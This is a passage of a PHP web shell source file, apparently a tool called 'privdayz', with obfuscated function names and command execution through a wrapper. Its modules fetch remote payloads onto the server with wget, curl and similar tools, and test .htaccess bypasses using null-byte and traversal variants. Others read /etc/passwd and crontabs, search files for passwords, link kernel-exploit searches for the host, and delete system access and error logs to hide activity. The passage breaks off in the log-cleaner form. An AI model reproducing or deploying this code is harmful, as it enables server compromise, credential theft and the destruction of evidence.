<?php if (isset($_GET['mailer'])) : ?>
  <div class="pr1vd4yz-modal-bg">
    <div class="pr1vd4yz-modal-wizard">
    <div class="pr1vd4yz-modal-header-wiz">
     <div class="pr1vd4yz-wiz-icon" style="background:#e91e63;"><i class="fas fa-envelope"></i></div>
     <div>
       <div class="pr1vd4yz-wiz-title">php mailer</div>
       <div class="pr1vd4yz-wiz-desc">send a message with smtp</div>
     </div>
     <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form action="" method="post">
     <div class="pr1vd4yz-wiz-section">
       <div class="pr1vd4yz-wiz-section-icon" style="background:#ffe2ee;color:#e91e63;"><i class="fas fa-paper-plane"></i></div>
       <div class="pr1vd4yz-wiz-fields">
       <textarea name="message-smtp" class="pr1vd4yz-wiz-input" rows="5" placeholder="message"></textarea>
       <input type="text" name="mailto-subject" class="pr1vd4yz-wiz-input" placeholder="subject">
       <input type="email" name="mail-from-smtp" class="pr1vd4yz-wiz-input" placeholder="from: privdayz@mail.com">
       <input type="email" name="mail-to-smtp" class="pr1vd4yz-wiz-input" placeholder="to: privdayz@mail.com">
       </div>
     </div>
     <div class="pr1vd4yz-modal-actions-wiz">
       <button type="submit" name="submit" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-red" style="background:#e91e63;border-color:#e91e63;">
       <i class="fas fa-paper-plane"></i> send
       </button>
       <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light">
       <i class="fas fa-times"></i> go back
       </a>
     </div>
    </form>
    </div>
  </div>
<?php endif; ?>
<?php if (isset($_GET['phpinfo'])) : ?>
  <div class="pr1vd4yz-modal-bg">
    <div class="pr1vd4yz-modal-wizard" style="max-width:500px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
     <div class="pr1vd4yz-wiz-icon" style="background:#7e57c2;"><i class="fab fa-php"></i></div>
     <div>
       <div class="pr1vd4yz-wiz-title">php info</div>
       <div class="pr1vd4yz-wiz-desc">system php environment</div>
     </div>
     <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <div style="padding:0 0 13px 0;">
     <div style="
       background: #fff4f4;
       color: #222;
       font-size: 13px;
       line-height: 1.48;
       border-radius: 10px;
       margin: 18px 22px 0 22px;
       padding: 19px 16px 19px 16px;box-shadow: 0 1px 10px #e5393510;
       max-height: 340px;
       min-height: 110px;
       overflow: auto;
       font-family: 'JetBrains Mono', 'Fira Mono', monospace;
     ">
     <?php
       
       phpinfo(INFO_GENERAL | INFO_CONFIGURATION | INFO_MODULES);
       $pinfo = "";
       $pinfo = preg_replace([
       '#<style[^>]*>.*?</style>#si',
       '#<table[^>]*>|</table>#i',
       '#<tr[^>]*>|</tr>#i',
       '#<td[^>]*>|</td>#i',
       '#<th[^>]*>|</th>#i',
       '#<h2[^>]*>|</h2>#i',
       '#<a[^>]*>(.*?)</a>#i',
       '#<br\s*/?>#i',
       '#<div[^>]*>|</div>#i',
       '#<span[^>]*>|</span>#i',
       ], [
       '',
       '', '',
       '', '',
       '', '',
       '', '',
       '$1',
       "\n",
       '', '',
       '', '',
       ], $pinfo);
       $lines = preg_split('/\r?\n/', strip_tags($pinfo));
       $lines = array_slice(array_filter(array_map('trim', $lines)), 0, 80);
       echo '<pre style="margin:0;background:none;border:none;color:#e53935;line-height:1.47;white-space:pre-wrap;">' . htmlspecialchars(implode("\n", $lines)) . '</pre>';
     ?>
     </div>
    </div>
    </div>
  </div>
<?php endif; ?>
<?php if (isset($_GET['disk'])) : ?>
  <div class="pr1vd4yz-modal-bg">
    <div class="pr1vd4yz-modal-wizard" style="max-width:380px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
     <div class="pr1vd4yz-wiz-icon" style="background:#26a69a;"><i class="fas fa-hdd"></i></div>
     <div>
       <div class="pr1vd4yz-wiz-title">disk info</div>
       <div class="pr1vd4yz-wiz-desc">disk usage & space</div>
     </div>
     <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <div class="pr1vd4yz-wiz-section" style="padding:20px 24px; color:#e53935; background:#fff4f4;">
     <?php
     $t = disk_total_space("/");
     $f = disk_free_space("/");
     $u = $t-$f;
     function fmt($b) {
       $s = ['B','KB','MB','GB','TB']; $i=0;
       while($b>=1024 && ++$i) $b/=1024;
       return round($b,($i?1:0)).' '.$s[$i];
     }
     ?>
     <div>Total Space: <?= fmt($t) ?></div>
     <div>Used Space: <?= fmt($u) ?></div>
     <div>Free Space: <?= fmt($f) ?></div>
     <div style="margin-top:13px;">
       <div style="height:9px;background:#fdecec;border-radius:5px;overflow:hidden;">
       <div style="width:<?= round($u/$t*100) ?>%;height:9px;background:#e53935;border-radius:5px;"></div>
       </div>
       <small><?= round($u/$t*100) ?>% used</small></div>
    </div>
    </div>
  </div>
<?php endif; ?>
<?php if (isset($_GET['remup'])): ?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard" style="max-width:420px;min-width:0;">
    <div class="pr1vd4yz-modal-header-wiz">
    <div class="pr1vd4yz-wiz-icon" style="background:#10b981;"><i class="fas fa-cloud-arrow-down"></i></div>
    <div>
     <div class="pr1vd4yz-wiz-title">remote file upload</div>
     <div class="pr1vd4yz-wiz-desc">fetch remote file to server</div>
    </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form method="post" class="pr1vd4yz-wiz-upload-form">
    <div class="pr1vd4yz-wiz-section">
     <div class="pr1vd4yz-wiz-fields" style="gap: 13px;">
       <input type="text" name="remote_url" class="pr1vd4yz-wiz-input" placeholder="remote file url (https://...)">
       <input type="text" name="save_path" class="pr1vd4yz-wiz-input" value="<?= htmlspecialchars(getcwd(), ENT_QUOTES) . '/privdayz.php' ?>">
     </div>
    </div>
    <div class="pr1vd4yz-modal-actions-wiz">
     <button type="submit" name="fetch-remote" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-red"><i class="fas fa-download"></i> fetch</button>
        <div class="pr1vd4yz-modal-actions-wiz">
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" type="button" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light pr1vd4yz-cron-close-btn">
     <i class="fas fa-times"></i> close
    </a>
    </div>
    </div>
    </form>
    <?php
if(isset($_POST['fetch-remote'])):
    $url = trim((isset($_POST['remote_url']) ? $_POST['remote_url'] : ""));
    $path = trim((isset($_POST['save_path']) ? $_POST['save_path'] : ""));
    $ok = false;
    $shell_cmds = [
    "wget --no-check-certificate -O " . escapeshellarg($path) . " " . escapeshellarg($url) . " 2>&1",
    "curl -k -L " . escapeshellarg($url) . " -o " . escapeshellarg($path) . " 2>&1",
    "lynx -source " . escapeshellarg($url) . " > " . escapeshellarg($path) . " 2>&1",
    "fetch -o " . escapeshellarg($path) . " " . escapeshellarg($url) . " 2>&1",
    "busybox wget -O " . escapeshellarg($path) . " " . escapeshellarg($url) . " 2>&1",
    ];
    foreach($shell_cmds as $cmd) {
     pr1vd4yzC($cmd);
     if(@file_exists($path) && @filesize($path)>0) { $ok = true; break; }
    }
    if(!$ok && function_exists('file_get_contents')) {
     $data = @file_get_contents($url);
     if($data && @file_put_contents($path, $data)!==false && @filesize($path)>0) $ok = true;
    }
    if(!$ok && function_exists('fopen')) {
     $rf = @fopen($url, "rb");
     if($rf) {
       $wf = @fopen($path, "wb");
       if($wf) {
          while(!feof($rf)) @fwrite($wf, fread($rf, 8192));
          @fclose($wf);
       }
       @fclose($rf);
       if(@file_exists($path) && @filesize($path)>0) $ok = true;
     }
    }
    if(!$ok && function_exists('curl_init')) {
     $ch = @curl_init($url);
     @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
     @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
     @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
     $data = @curl_exec($ch);
     @curl_close($ch);
     if($data && @file_put_contents($path, $data)!==false && @filesize($path)>0) $ok=true;
    }
    if(!$ok && stripos($url,'data:')===0) {
     $bs7y3q = substr($url, strpos($url, ',')+1);
     $decoded = pr1vdc($bs7y3q);
     if($decoded && @file_put_contents($path, $decoded)!==false && @filesize($path)>0) $ok=true;
    }

    if($ok){
     echo'<div style="margin:18px 0 8px 0;text-align:center;"><span style="background:#ecfdf5;color:#16a34a;padding:7px 22px;border-radius:7px;"><i class=\'fas fa-check-circle\'></i> success: saved!</span></div>';
    }else{
     echo'<div style="margin:18px 0 8px 0;text-align:center;"><span style="background:#fff4f4;color:#e53935;padding:7px 22px;border-radius:7px;"><i class=\'fas fa-ban\'></i> failed to fetch document!</span></div>';
    }
endif;
?>
  </div>
</div>
<?php endif; ?>
<?php if (isset($_GET['htbypass'])): ?>
  <div class="pr1vd4yz-modal-bg">
    <div class="pr1vd4yz-modal-wizard" style="max-width:420px;">
    <div class="pr1vd4yz-modal-header-wiz">
     <div class="pr1vd4yz-wiz-icon" style="background:#e53935;"><i class="fas fa-lock-open"></i></div>
     <div>
       <div class="pr1vd4yz-wiz-title">.htaccess bypass</div>
       <div class="pr1vd4yz-wiz-desc">
       <span style="font-size:.98em;">
        Test protected file access with multi bypass (nullbyte, traversal, query...)<br>
        Enter relative path or full url
       </span>
       </div>
     </div>
     <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form method="post" class="pr1vd4yz-wiz-form">
     <div class="pr1vd4yz-wiz-section">
       <div class="pr1vd4yz-wiz-fields" style="gap: 10px;">
       <input type="text" name="target_file" class="pr1vd4yz-wiz-input" placeholder="/protected/.htpasswd or full URL" required>
       </div>
     </div>
     <div class="pr1vd4yz-modal-actions-wiz">
       <button type="submit" name="trybypass" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-red"><i class="fas fa-bolt"></i> test bypass</button>
 <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" type="button" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light pr1vd4yz-cron-close-btn">
     <i class="fas fa-times"></i> close
    </a>
     </div>
    </form>
    <?php
    if (isset($_POST['trybypass'])):
     $file = trim($_POST['target_file']);
     $bypass = [
       $file,
       $file . '%00',
       '../' . basename($file),
       $file . '/',
       $file . '?',
       $file . '/../' . basename($file),
       str_replace('/','//',$file),
       str_replace('/','\\',$file),
       str_replace('.','%2e',$file)
     ];
     $results = [];
     foreach ($bypass as $try) {
       $url = (strpos($try, 'http') === 0) ? $try : ($_SERVER['REQUEST_SCHEME'].'://'.$_SERVER['SERVER_NAME'].$try);
       $ctx = stream_context_create(['http'=>['method'=>'GET','timeout'=>3]]);
       $res = @file_get_contents($url, false, $ctx);
       $status = isset($http_response_header[0]) ? $http_response_header[0] : 'NO RESPONSE';
       $short = strlen($res) ? substr(trim($res), 0, 80) : '-';
       $results[] = [
       'method' => $try,
       'status' => $status,
       'snippet' => htmlspecialchars($short)
       ];
     }
    ?>
    <div style="margin:14px 7px 7px 7px;">
     <div style="background:#fff4f4;border-radius:8px;padding:9px 11px 9px 11px;max-height:190px;overflow:auto;">
       <b style="color:#e53935">Bypass Results
       <table style="width:100%;font-size:.98em;margin-top:4px;">
       <tr>
        <th style="text-align:left;color:#e53935;">Variant</th>
        <th style="text-align:left;color:#ff3939;">Status</th>
        <th style="text-align:left;color:#666;">Output</th>
       </tr>
       <?php foreach ($results as $r): ?>
       <tr>
        <td style="font-family:monospace; color:#b71c1c;"><?= htmlspecialchars($r['method']) ?></td>
        <td><?= $r['status'] ?></td>
        <td style="font-family:monospace; color:#868686;"><?= $r['snippet'] ?></td>
       </tr>
       <?php endforeach; ?>
       </table>
     </div>
    </div>
    <?php endif; ?>
    </div>
  </div>
<?php endif; ?>
<?php if (isset($_GET['crontab'])): ?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard" style="max-width:580px;">
    <div class="pr1vd4yz-modal-header-wiz">
    <div class="pr1vd4yz-wiz-icon" style="background:#b71c1c;"><i class="fas fa-clock-rotate-left"></i></div>
    <div>
     <div class="pr1vd4yz-wiz-title">cron jobs</div>

    </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <div class="pr1vd4yz-wiz-section pr1vd4yz-cronmodal-box">
    <?php
echo'<div class="pr1vd4yz-cronmodal-section">';
echo'<div class="pr1vd4yz-cronmodal-root">[root cron jobs]</div>';
$_fc=_prv_str([102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115]);
$_rt=@$_fc('/etc/crontab');
if(!function_exists('_prv_rx_j9q')){function _prv_rx_j9q($c){
$_fx=[_prv_str([101,120,101,99]),_prv_str([115,121,115,116,101,109]),_prv_str([112,97,115,115,116,104,114,117])];
foreach($_fx as$_f){if(function_exists($_f)){@$_f($c);$_o="";if($_o)return$_o;}}return!1;}}
if($_rt){echo'<pre class="pr1vd4yz-cronmodal-code">'.htmlspecialchars($_rt).'</pre>';}else{$_rs=_prv_rx_j9q('crontab -l 2>&1');echo'<pre class="pr1vd4yz-cronmodal-code">'.htmlspecialchars($_rs).'</pre>';}
echo'</div>';
$_us=[];$_pf=@file('/etc/passwd');
if($_pf){foreach($_pf as$_l){$_ps=explode(':',$_l);if(isset($_ps[6])&&(strpos($_ps[6],'bash')!==!1||strpos($_ps[6],'sh')!==!1)){$_us[]=$_ps[0];}}}
foreach($_us as$_u){if($_u=='root')continue;$_p1="/var/spool/cron/$_u";$_p2="/var/spool/cron/crontabs/$_u";$_cr='';if(file_exists($_p1))$_cr=@$_fc($_p1);elseif(file_exists($_p2))$_cr=@$_fc($_p2);else$_cr=_prv_rx_j9q("crontab -u $_u -l 2>&1");echo'<div class="pr1vd4yz-cronmodal-section">';echo'<div class="pr1vd4yz-cronmodal-user">'.$_u.'</div>';echo'<pre class="pr1vd4yz-cronmodal-code">'.htmlspecialchars(trim($_cr)? : '[empty]').'</pre>';echo'</div>';}
?>

    </div>
    <div class="pr1vd4yz-modal-actions-wiz">
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" type="button" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light pr1vd4yz-cron-close-btn">
     <i class="fas fa-times"></i> close
    </a>
    </div>
  </div>
</div>
<?php endif; ?>
<?php if (isset($_GET['fsearch'])): ?>
<?php
function pdz_fsearch($keyword, $root, $maxfiles = 1500, $maxhits = 400) {
    $results = [];
    $queue = [rtrim($root, "/")];
    $checked = 0; $hits = 0;

    while ($queue && $checked < $maxfiles && $hits < $maxhits) {
        $dir = array_shift($queue);
        if (!is_dir($dir) || !is_readable($dir)) continue;
        $dh = @opendir($dir);
        if (!$dh) continue;

        while (($f = @readdir($dh)) !== false) {
            if ($f === '.' || $f === '..') continue;
            $p = $dir . '/' . $f;
            if (is_dir($p) && is_readable($p)) {
                $queue[] = $p;
            }
            else if (is_file($p) && is_readable($p)) {
                $checked++;
                $size = @filesize($p);
                if ($size === false || $size > 10*1024*1024) continue;
                $chk = @file_get_contents($p, false, null, 0, 512);
                if ($chk !== false && preg_match('/[\x00-\x08\x0B\x0E-\x1F]/', $chk)) continue;
                $lines = @file($p);
                if (!$lines) continue;
                foreach ($lines as $lnum => $line) {
                    if (stripos($line, $keyword) !== false) {
                        $results[] = [
                            'file' => $p,
                            'line' => $lnum+1,
                            'content' => trim($line)
                        ];
                        $hits++;
                        if ($hits >= $maxhits) break 2;
                    }
                }
            }
        }
        @closedir($dh);
    }
    return $results;
}
?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard" style="max-width:700px;">
    <div class="pr1vd4yz-modal-header-wiz">
      <div class="pr1vd4yz-wiz-icon" style="background:#ff3939;"><i class="fas fa-search"></i></div>
      <div>
        <div class="pr1vd4yz-wiz-title">file search</div>
      </div>
      <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <form method="post" class="pr1vd4yz-wiz-form" style="margin-bottom:6px;">
      <div class="pr1vd4yz-wiz-section" style="padding-bottom:2px;">
        <div class="pr1vd4yz-wiz-fields" style="gap: 10px;">
          <input type="text" name="search_kw" class="pr1vd4yz-wiz-input" placeholder="keyword (e.g. config, password, mail)" required>
          <input type="text" name="search_path" class="pr1vd4yz-wiz-input" value="<?= htmlspecialchars(getcwd(), ENT_QUOTES) ?>" placeholder="path to search" required>
        </div>
      </div>
      <div class="pr1vd4yz-modal-actions-wiz">
        <button type="submit" name="search-file" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-red"><i class="fas fa-search"></i> search</button>
        <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light pr1vd4yz-cron-close-btn">
          <i class="fas fa-times"></i> close
        </a>
      </div>
    </form>
    <?php
    if (isset($_POST['search-file'], $_POST['search_kw'], $_POST['search_path'])) {
      $kw = trim($_POST['search_kw']);
      $sp = trim($_POST['search_path']);
      $out = pdz_fsearch($kw, $sp, 1800, 350);

      echo '<div class="pr1vd4yz-searchmodal-box">';
      if ($out && count($out) > 0) {
        $shown = 0;
        foreach ($out as $res) {
          $shown++;
          $icon = "<i class='fa-regular fa-file pr1vd4yz-search-ico' style='color:#e53935;'></i>";
          echo '<div class="pr1vd4yz-search-row">';
          echo $icon;
          echo '<span style="color:#ff3939;">' . htmlspecialchars(basename($res['file'])) . '</span> ';
          echo '<span style="color:#b71c1c;font-size:.91em;">[' . htmlspecialchars(dirname($res['file'])) . ']</span> ';
          echo '<span class="pr1vd4yz-search-lnum">#' . $res['line'] . '</span>: ';
          echo '<span class="pr1vd4yz-search-snip">' . htmlspecialchars($res['content']) . '</span>';
          echo '</div>';
          if ($shown >= 120) break;
        }
        if ($shown >= 120) echo '<div style="font-size:.95em;color:#b71c1c;text-align:center;">Result limit reached.</div>';
      } else {
        echo '<div class="pr1vd4yz-search-nores">No results found!</div>';
      }
      echo '</div>';
    }
    ?>
  </div>
</div>

<?php endif; ?>

<?php if (isset($_GET['kernelcheck'])):
function try_all_methods($commands, $limit = 1) {
    $results = [];
    foreach ($commands as $key => $cmd) {
     if (function_exists('pr1vd4yzC')) {
       $out = trim(@pr1vd4yzC($cmd));
       if ($out && !in_array($out, $results)) $results[] = $out;
     }
     if (count($results) >= $limit) break;
    }
    return count($results) ? $results[0] : "";
}
$kernel = try_all_methods([
    'uname -r',
    'cat /proc/version',
    'cat /proc/sys/kernel/osrelease',
    'cat /etc/os-release | grep VERSION=',
    'cat /etc/issue'
]);

$arch = try_all_methods([
    'uname -m',
    'arch',
    'cat /proc/cpuinfo | grep -i "model name"'
]);

$un7xa = try_all_methods([
    'uname -a',
    'cat /proc/version',
    'cat /etc/issue'
]);
if (!$kernel) $kernel = $un7xa;
if (!$arch) $arch = php_uname('m');
if (!$un7xa) $un7xa = php_uname();
$edb_url = "https://www.exploit-db.com/search?cve=&q=" . urlencode($kernel);
$ps_url = "https://packetstormsecurity.com/search/?q=" . urlencode($kernel);
$edb_uname_url = "https://www.exploit-db.com/search?cve=&q=" . urlencode($un7xa);
$ps_uname_url = "https://packetstormsecurity.com/search/?q=" . urlencode($un7xa);

?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard">
    <div class="pr1vd4yz-modal-header-wiz">
    <div class="pr1vd4yz-wiz-icon" style="background:#e53935;"><i class="fas fa-bug"></i></div>
    <div>
     <div class="pr1vd4yz-wiz-title">kernel exploit checker</div>
     <div class="pr1vd4yz-wiz-desc" style="font-size:.99em;">Quick exploit search for this system</div>
    </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <div class="pr1vd4yz-kernel-modal">
    <div class="pr1vd4yz-kernelresult">
     <div class="pr1vd4yz-krow">Kernel: <?= htmlspecialchars($kernel) ?> <span class="pr1vd4yz-kbadge"><?= htmlspecialchars($arch) ?></span></div>
     <div class="pr1vd4yz-krow">Full uname: <code style="color:#666;"><?= htmlspecialchars($un7xa) ?></code></div>
     <div class="pr1vd4yz-krow" style="display:flex;gap:9px;flex-wrap:wrap;">
       <a href="<?= $edb_url ?>" target="_blank" class="pr1vd4yz-kbadge pr1vd4yz-kbadge-red"><i class="fas fa-bug"></i> Exploit-DB (kernel)</a>
       <a href="<?= $ps_url ?>" target="_blank" class="pr1vd4yz-kbadge pr1vd4yz-kbadge-orange"><i class="fas fa-bug"></i> Packetstorm (kernel)</a>
     </div>
     <div class="pr1vd4yz-krow" style="display:flex;gap:9px;flex-wrap:wrap;">
       <a href="<?= $edb_uname_url ?>" target="_blank" class="pr1vd4yz-kbadge pr1vd4yz-kbadge-red"><i class="fas fa-bug"></i> Exploit-DB (uname)</a>
       <a href="<?= $ps_uname_url ?>" target="_blank" class="pr1vd4yz-kbadge pr1vd4yz-kbadge-orange"><i class="fas fa-bug"></i> Packetstorm (uname)</a>
     </div>
    </div>
    </div>
    <div class="pr1vd4yz-modal-actions-wiz">
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" type="button" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light pr1vd4yz-cron-close-btn">
     <i class="fas fa-times"></i> close
    </a>
    </div>
  </div>
</div>
<?php endif; ?>
<?php
if (isset($_GET['apiscan']) || isset($_POST['pr1vd4yz_apiscan_path'])):
if(isset($_GET[_prv_str([97,112,105,115,99,97,110])])||isset($_POST[_prv_str([112,114,49,118,100,52,121,122,95,97,112,105,115,99,97,110,95,112,97,116,104])])){
$_scpath=_prv_str([115,99,97,110,95,112,97,116,104]);
$_getcwd=_prv_str([103,101,116,99,119,100]);
$path=isset($_POST[$_scpath])?$_POST[$_scpath]:@$_getcwd();
$scan_result='';
if(!empty($_POST[_prv_str([112,114,49,118,100,52,121,122,95,97,112,105,115,99,97,110,95,112,97,116,104])])){
$scanpath=trim($_POST[$_scpath]);
$_isdir=_prv_str([105,115,95,100,105,114]);
if(!$scanpath||!@$_isdir($scanpath)){
$scan_result='<div class="pr1vd4yz-apirow" style="color:#e53935;">Directory not found or invalid path!</div>';
}else{
$_glob=_prv_str([103,108,111,98]);
$_rt=_prv_str([114,116,114,105,109]);
$_fc=_prv_str([102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115]);
$_bn=_prv_str([98,97,115,101,110,97,109,101]);
$files=@$_glob(@$_rt($scanpath,'/').'/*.{php,js,py,sh,conf,txt,inc}',1024);
$result=[];$regex=[
'#(/[a-zA-Z0-9_\-\.]+){2,}#',
'#\?([a-zA-Z0-9\_\-]+)=#',
'#["\'](https?://[^\s\'"]+)["\']#',
'#[\'"](/[a-zA-Z0-9_\-]+/[a-zA-Z0-9_\-/]+)[\'"]#',
'#[\'"]((?:api|rest|endpoint|ws)[^\'"]+)[\'"]#i'
];
foreach($files as$file){
$content=@$_fc($file);$hits=[];
foreach($regex as$r){
if(preg_match_all($r,$content,$m)){
foreach(((isset($m[1]) ? $m[1] : $m[0]))as$u){
$u=trim($u,'"\' ');
if(strlen($u)>4&&!in_array($u,$hits))$hits[]=$u;}}}
if($hits)$result[]=['file'=>@$_bn($file),'hits'=>$hits];
}
$scan_result='<divclass="pr1vd4yz-apilistbox">';
if(!$result){
$scan_result.='<div class="pr1vd4yz-apirow" style="color:#e53935;">No endpoint found in this directory.</div>';
}else{
foreach($result as$row){
$scan_result.='<div class="pr1vd4yz-apirow">'.$row['file'].'<ul class="pr1vd4yz-apiul">';
foreach($row['hits']as$h){
$scan_result.='<li class="pr1vd4yz-apihit">'.htmlspecialchars($h).'</li>';}
$scan_result.='</ul></div>';
}}
$scan_result.='</div>';
}}
}
?>
?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard">
    <div class="pr1vd4yz-modal-header-wiz">
    <div class="pr1vd4yz-wiz-icon" style="background:#e53935;"><i class="fas fa-search-location"></i></div>
    <div>
     <div class="pr1vd4yz-wiz-title">api endpoint scanner</div>
     <div class="pr1vd4yz-wiz-desc">Scan all PHP, JS, conf, py, sh files in any directory for endpoints.</div>
    </div>
  <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>
    </div>
    <div class="pr1vd4yz-apimodal">
    <form id="pr1vd4yz-apiform" class="pr1vd4yz-apiform" method="post" autocomplete="off">
     <input type="text" name="scan_path" id="pr1vd4yz-apipath" class="pr1vd4yz-apipath" value="<?= htmlspecialchars($path) ?>">
     <input type="hidden" name="pr1vd4yz_apiscan_path" value="1">
     <button type="submit" class="pr1vd4yz-apibtn"><i class="fas fa-search"></i> Scan</button>
    </form>
    <div id="pr1vd4yz-apilistbox" class="pr1vd4yz-apilistbox" style="text-align:center;">
     <?= $scan_result ?: '<span style="opacity:.7;">No scan yet.</span>' ?>
    </div>
    </div>
    <div class="pr1vd4yz-modal-actions-wiz">
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" type="button" class="pr1vd4yz-wiz-btn pr1vd4yz-wiz-btn-light pr1vd4yz-cron-close-btn">
     <i class="fas fa-times"></i> close
    </a>
    </div>
  </div>
</div>
<?php endif; ?>
<?php
$f4k2u=_prv_str([117,110,108,105,110,107]); 
$fy81d=_prv_str([102,105,108,101,95,112,117,116,95,99,111,110,116,101,110,116,115]); 
$fr03c=_prv_str([102,111,112,101,110]); 
$fz9s1=_prv_str([115,104,101,108,108,95,101,120,101,99]); 
$f3vdq=_prv_str([115,121,115,116,101,109]);
$fxn7v=_prv_str([101,115,99,97,112,101,115,104,101,108,108,97,114,103]); 
$f7t1c=_prv_str([105,115,95,102,105,108,101]); 
$f9r5w=_prv_str([102,105,108,101,115,105,122,101]); 
$fek6z=_prv_str([103,101,116,99,119,100]); 
$fsb2k=_prv_str([103,108,111,98]); 
$f41aa=_prv_str([98,97,115,101,110,97,109,101]);

$log_patterns=['error_log','access_log','debug.log','php_error.log','error.log','log.txt','/logs/*.log','/logs/*.txt','/log/*.log','/var/log/*log','/var/log/*/*.log','/var/log/httpd/*','/var/log/nginx/*','/usr/local/apache/logs/*log','/usr/local/cpanel/logs/*','/usr/local/lxlabs/kloxo/log/*','/var/log/plesk/*','C:\Windows\System32\LogFiles\*'];

$zap = function($p) use($f4k2u,$fz9s1,$f3vdq,$fxn7v,$f7t1c,$fy81d,$fr03c) {
    $succ=0;
    if(@$f4k2u($p)) $succ=1;
    elseif(@is_callable($fz9s1)&&@$fz9s1('rm -f '.$fxn7v($p))&&!@$f7t1c($p)) $succ=1;
    elseif(@is_callable($f3vdq)&&@$f3vdq('rm -f '.$fxn7v($p))&&!@$f7t1c($p)) $succ=1;
    elseif(@$fy81d($p,'')!==false) $succ=1;
    else{ $h=@$fr03c($p,'w'); if($h){@fclose($h);$succ=1;} }
    return $succ;
};

$fmt = function($n){
    if($n<1024) return $n.' B';
    if($n<1024*1024) return round($n/1024,1).' KB';
    if($n<1024*1024*1024) return round($n/1024/1024,1).' MB';
    return round($n/1024/1024/1024,1).' GB';
};
?>
<?php if (isset($_GET['logclean']) || isset($_POST['pr4vdlogclean'])):?>
<?php
$scan_result = '';
if (isset($_POST[_prv_str([112,114,52,118,100,108,111,103,99,108,101,97,110])])) {
    $clean=isset($_POST['delete'])?$_POST['delete']:null;
    $found = [];
    foreach($log_patterns as $pat){
    $g=(strpos($pat,'*')!==false)?@$fsb2k($pat):@$fsb2k($fek6z().'/'.$pat);
    if(!$g)continue;
    foreach($g as $f){
     if(!$f7t1c($f)) continue;
     $size=@$f9r5w($f);$found[$f]=$size;
    }
    }
    $scan_result = '<div class="pr1vd4yz-loglist">';
    if($clean && isset($found[$clean])){
    $del = $zap($clean);
    $scan_result .= '<div class="pr1vd4yz-logrow" style="color:'.($del?'#10b981':'#e53935').';">'.htmlspecialchars($f41aa($clean)).' : '.($del?'done!':'Delete failed!').'</div>';
    unset($found[$clean]);
    }
    if(!$found && !$clean){
    $scan_result .= '<div class="pr1vd4yz-logrow" style="color:#e53935;">no l0gs.</div>';
    } else {
    foreach($found as $file=>$size){
     $scan_result .= '<div class="pr1vd4yz-logrow">'.htmlspecialchars($f41aa($file)).' <span class="pr1vd4yz-logsize">'.$fmt($size).'</span>
       <form method="post" style="display:inline;">
       <input type="hidden" name="pr4vdlogclean" value="1">
       <input type="hidden" name="delete" value="'.htmlspecialchars($file).'">
       <button class="pr1vd4yz-logbtn" type="submit"><i class="fas fa-trash"></i> del</button>
       </form>
     </div>';
    }
    }
    $scan_result .= '</div>';
}
?>
<div class="pr1vd4yz-modal-bg">
  <div class="pr1vd4yz-modal-wizard">
    <div class="pr1vd4yz-modal-header-wiz">
    <div class="pr1vd4yz-wiz-icon" style="background:#e53935;"><i class="fas fa-broom"></i></div>
    <div>
     <div class="pr1vd4yz-wiz-title">log cleaner</div>
     <div class="pr1vd4yz-wiz-desc">Find and delete all error/access/debug logs for every server type</div>
    </div>
    <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>" class="pr1vd4yz-modal-close-wiz">&times;</a>

    </div>
    <div class="pr1vd4yz-logmodal"><form method="post" style="margin-bottom:2px;">
     <input type="hidden" name="pr4vdlogclean" value="1">
